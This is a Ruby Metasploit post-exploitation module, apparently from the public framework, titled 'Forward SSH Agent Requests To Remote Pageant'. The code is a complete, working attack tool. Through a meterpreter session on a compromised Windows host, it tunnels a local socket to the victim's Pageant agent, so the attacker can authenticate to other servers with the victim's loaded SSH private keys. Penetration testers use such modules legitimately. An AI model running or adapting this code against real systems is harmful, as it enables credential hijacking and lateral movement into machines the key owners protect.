##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'tmpdir'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Forward SSH Agent Requests To Remote Pageant',
                      'Description'   => %q{
                         This module forwards SSH agent requests from a local socket to a remote Pageant instance.
                         If a target Windows machine is compromised and is running Pageant, this will allow the
                         attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are
                         tunneled through the meterpreter session. This could therefore be used to authenticate
                         with a remote host using a private key which is loaded into a remote user's Pageant instance,
                         without ever having knowledge of the private key itself.

                         Note that this requires the PageantJacker meterpreter extension, but this will be automatically
                         loaded into the remote meterpreter session by this module if it is not already loaded.
                       },
                      'License'       => MSF_LICENSE,
                      'Author'        => [
                        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
                        'Ben Campbell', # A HUGE amount of support in this :-)
                      ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
      [
        OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil])
      ])
  end

  def setup
    unless session.extapi
      vprint_status("Loading extapi extension...")
      begin
        session.core.use("extapi")
      rescue Errno::ENOENT
        print_error("This module is only available in a windows meterpreter session.")
        return
      end
    end
  end


  def run
    # Check to ensure that UNIX sockets are supported
    begin
      ::UNIXServer
    rescue NameError
      print_error("This module is only supported on a Metasploit installation that supports UNIX sockets.")
      return false
    end

    # Get the socket path from the user supplied options (or leave it blank to get the plugin to choose one)
    if datastore['SocketPath']
      @sockpath = datastore['SocketPath'].to_s
    else
      @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
    end

    # Quit if the file exists, so that we don't accidentally overwrite something important on the host system
    if ::File.exist?(@sockpath)
      print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
      return false
    end

    # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.
    ::UNIXServer.open(@sockpath) do |serv|
      print_status("Launched listening socket on #{@sockpath}")
      print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
      print_status("Now use any tool normally (e.g. ssh-add)")

      loop do
        s = serv.accept
        loop do
          socket_request_data = s.recvfrom(8192) # 8192 = AGENT_MAX
          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
          vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
          response = session.extapi.pageant.forward(socket_request_data.first, socket_request_data.first.size)
          if response[:success]
            begin
              s.send response[:blob], 0
          rescue
            break
            end
            vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')")
          else
            print_error("PageantJacker: Unsuccessful response received (#{translate_error(response[:error])})")
          end
        end
      end
    end
  end

  def cleanup
    # Remove the socket that we created, if it still exists
    ::File.delete(@sockpath) if ::File.exist?(@sockpath) if @sockpath
  end

  def translate_error(errnum)
    errstring = "#{errnum}: "
    case errnum
    when 0
      errstring += "No error"
    when 1
      errstring += "The Pageant request was not processed."
    when 2
      errstring += "Unable to obtain IPC memory address."
    when 3
      errstring += "Unable to allocate memory for Pageant<-->Meterpreter IPC."
    when 4
      errstring += "Unable to allocate memory buffer."
    when 5
      errstring += "Unable to build Pageant request string."
    when 6
      errstring += "Pageant not found."
    when 7
      errstring += "Not forwarded."
    else
      errstring += "Unknown."
    end
    errstring
  end
end
